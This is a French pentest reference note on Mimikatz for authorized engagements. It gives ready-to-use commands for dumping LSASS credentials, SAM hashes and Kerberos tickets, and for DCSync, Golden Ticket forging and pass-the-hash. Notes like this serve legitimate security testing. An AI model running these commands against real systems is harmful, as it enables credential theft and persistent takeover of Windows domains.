---
titre: "Mimikatz"
tags: [Outils, AD, windows, credentials, post-exploitation]
source: https://github.com/gentilkiwi/mimikatz
---

# Mimikatz

**Extraction de secrets Windows** (post-exploitation, exécuté sur la cible avec
des droits élevés) : mots de passe en clair, hashes NTLM, tickets Kerberos, et
attaques emblématiques (**pass-the-hash**, **pass-the-ticket**, **Golden Ticket**).

> ⚠️ Exécution sur machine compromise en **engagement autorisé** uniquement.
> Détecté par la plupart des EDR/AV. Cf. `README`.

## Récupération
```
# binaires officiels : https://github.com/gentilkiwi/mimikatz/releases
# (sous Kali, l'équivalent Linux = secretsdump.py d'Impacket)
```

## Commandes clés
```
privilege::debug                 # activer SeDebug (prérequis)
sekurlsa::logonpasswords         # creds en mémoire (LSASS) : NTLM, parfois clair
sekurlsa::tickets /export        # exporter les tickets Kerberos
lsadump::sam                     # hashes locaux (SAM)
lsadump::dcsync /user:krbtgt     # DCSync : récupérer le hash krbtgt
kerberos::golden /user:Admin /domain:d.local /sid:... /krbtgt:<hash> /ptt
sekurlsa::pth /user:Admin /domain:d.local /ntlm:<hash> /run:cmd   # pass-the-hash
```

## Réflexe
Alternative « à distance » depuis Linux : `secretsdump.py`/`getST.py`
([[Impacket]]). Le hash `krbtgt` (via DCSync) permet un **Golden Ticket**
(persistance domaine). À croiser avec [[BloodHound]] pour repérer les droits
DCSync.
